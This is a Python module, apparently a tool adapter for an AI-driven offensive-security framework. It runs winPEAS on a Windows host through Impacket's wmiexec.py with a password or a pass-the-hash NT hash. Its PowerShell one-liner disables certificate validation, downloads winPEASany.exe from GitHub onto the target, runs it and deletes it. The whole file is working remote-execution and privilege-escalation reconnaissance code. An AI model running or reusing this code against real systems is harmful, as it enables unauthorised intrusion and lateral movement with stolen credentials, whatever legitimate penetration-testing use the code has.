"""
Subprocess execution for winpeas: downloads and runs winPEASany.exe on a
Windows target over Impacket's wmiexec.py, using a single PowerShell
one-liner. No parsing logic here -- see parse.py.

The remote PowerShell command downloads the latest winPEASany.exe
release to the target's %TEMP%, executes it, then deletes it. Credential
handling follows this repo's own password/hashes convention (see
certipy_enum/netexec_enum/netexec_exploit).
"""
from __future__ import annotations

import shutil
import subprocess
from typing import List, Optional

from tradecraft.adapters.winpeas import parse as wp_parse

DEFAULT_TIMEOUT = 600  # winPEAS can take a while on a full sweep.

# PowerShell one-liner: downloads winPEASany.exe to %TEMP%, runs it, and
# deletes it afterward.
REMOTE_CMD = (
    "powershell -Command \""
    "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; "
    "$url = 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe'; "
    "$output = $env:TEMP + '\\\\winpeas.exe'; "
    "(New-Object System.Net.WebClient).DownloadFile($url, $output); "
    "& $output; "
    "Remove-Item $output -Force"
    "\""
)


def find_wmiexec_binary() -> Optional[str]:
    """Finds the wmiexec.py binary on PATH."""
    return shutil.which("wmiexec.py")


def _validate_credentials(
    username: str, password: str, hashes: str, domain: str
) -> Optional[str]:
    if not (domain or "").strip():
        return "domain is required for winpeas"
    if not (username or "").strip():
        return "username is required for winpeas"
    if (password or "").strip() and (hashes or "").strip():
        return "provide at most one of password or hashes, not both"
    if not (password or "").strip() and not (hashes or "").strip():
        return "one of password or hashes is required for winpeas"
    return None


def build_argv(
    target: str,
    domain: str,
    username: str,
    password: str = "",
    hashes: str = "",
    binary: str = "wmiexec.py",
) -> List[str]:
    """Builds argv for one winPEAS-over-wmiexec.py run.

    ``-dc-ip`` is set to the same host as the WMI target.
    """
    host = wp_parse.normalize_target_host(target)
    clean_domain = domain.strip()
    clean_user = username.strip()

    if hashes.strip():
        # If hashes already carries "LM:NT", pass it through; a bare NT
        # hash is prefixed with ":" so wmiexec.py treats it as NT-only.
        hashes_arg = hashes.strip() if ":" in hashes else f":{hashes.strip()}"
        return [
            binary,
            "-hashes",
            hashes_arg,
            "-dc-ip",
            host,
            f"{clean_domain}/{clean_user}@{host}",
            REMOTE_CMD,
        ]

    return [
        binary,
        "-dc-ip",
        host,
        f"{clean_domain}/{clean_user}:{password.strip()}@{host}",
        REMOTE_CMD,
    ]


def execute(
    target: str,
    domain: str,
    username: str,
    password: str = "",
    hashes: str = "",
    timeout: Optional[int] = None,
    runner=None,
) -> wp_parse.RawWinpeasResult:
    """Executes one winPEAS-over-wmiexec.py run."""
    host = wp_parse.normalize_target_host(target)
    if not host:
        return wp_parse.RawWinpeasResult(
            target=(target or "").strip(), domain=domain.strip(), error="empty target host"
        )

    credential_error = _validate_credentials(username, password, hashes, domain)
    if credential_error:
        return wp_parse.RawWinpeasResult(
            target=host, domain=domain.strip(), error=credential_error
        )

    binary = find_wmiexec_binary()
    if binary is None:
        return wp_parse.RawWinpeasResult(
            target=host,
            domain=domain.strip(),
            error="wmiexec.py binary not found on PATH",
        )

    if timeout is None:
        timeout = DEFAULT_TIMEOUT

    argv = build_argv(
        target=host,
        domain=domain,
        username=username,
        password=password,
        hashes=hashes,
        binary=binary,
    )

    run_cmd = runner or subprocess.run

    try:
        proc = run_cmd(
            argv,
            stdin=subprocess.DEVNULL,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        return wp_parse.RawWinpeasResult(
            target=host,
            domain=domain.strip(),
            error=f"winpeas execution timed out after {timeout}s",
        )
    except Exception as exc:  # noqa: BLE001 - surfaced to the model as a tool error
        return wp_parse.RawWinpeasResult(
            target=host,
            domain=domain.strip(),
            error=f"winpeas execution failed: {exc}",
        )

    return wp_parse.RawWinpeasResult(
        target=host,
        domain=domain.strip(),
        stdout=proc.stdout or "",
        stderr=proc.stderr or "",
        returncode=proc.returncode,
    )
